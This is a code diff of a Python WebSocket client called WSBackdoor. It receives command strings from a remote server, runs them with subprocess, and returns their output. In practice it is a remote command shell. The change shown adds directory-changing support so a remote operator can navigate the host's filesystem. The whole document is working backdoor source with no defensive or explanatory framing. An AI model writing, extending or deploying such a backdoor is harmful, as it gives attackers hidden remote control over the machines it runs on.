@@ -3,6 +3,7 @@
 from ws4py.client.threadedclient import WebSocketClient
 import subprocess
 import optparse
+import os
 
 __author__ = "f47h3r - Chase Schultz"
 
@@ -13,6 +14,14 @@ class WSBackdoor(WebSocketClient):
             stdout = proc.stdout.read() + proc.stderr.read()
             return stdout
     
+    def changeDir(self, args):
+        path = os.path.abspath(args)
+        if os.path.exists(path) and os.path.isdir(path):
+            os.chdir(path)
+            return True
+        else:
+            return False
+    
     def opened(self):
         self.send("Hello Server! - From Client\n")
 
@@ -20,9 +29,12 @@ class WSBackdoor(WebSocketClient):
         print "Closed down", code, reason
 
     def received_message(self, cmd):
+        self.cwd = os.getcwd()
         print "Received Message: %s Length: %d" % (str(cmd), len(cmd))
         cmd = str(cmd)
         command = cmd.split()
+        if command[0] == 'cd':
+            self.changeDir(command[1])
         print command
         response = self.__execute__(command)
         self.send(response)
